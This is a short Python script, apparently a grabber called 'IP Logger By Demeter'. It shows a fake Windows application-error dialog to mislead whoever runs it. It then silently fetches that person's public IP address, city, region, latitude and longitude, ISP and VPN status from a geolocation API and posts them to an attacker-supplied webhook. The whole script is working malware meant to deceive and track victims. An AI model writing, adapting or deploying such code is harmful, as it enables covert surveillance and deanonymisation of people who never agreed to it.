import requests
import ctypes

ctypes.windll.user32.MessageBoxW(0, u"The application failed to start properly (0xc000007b). Click the OK button to terminate the application.", u"ProgramName - Program Eror", 0)

webhook = "your_webhook"

def ip():
  try:
    api = "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query"
    data = requests.get(api).json()
    content = f"```IP Logger By Demeter \nIP: {data['query']}\nRegion: {data['regionName']}\nRegion: {data['city']}\nLatitude: {data['lat']}\nLongitude: {data['lon']}\nISP: {data['isp']}\nVPN?: {data['proxy']}```**Demeter Python IP Logger**"
    requests.post(webhook, json={"avatar_url":"https://bigrat.monster/",'username': 'Wow Ip Logger', 'content': content})
  except:
    pass

ip()
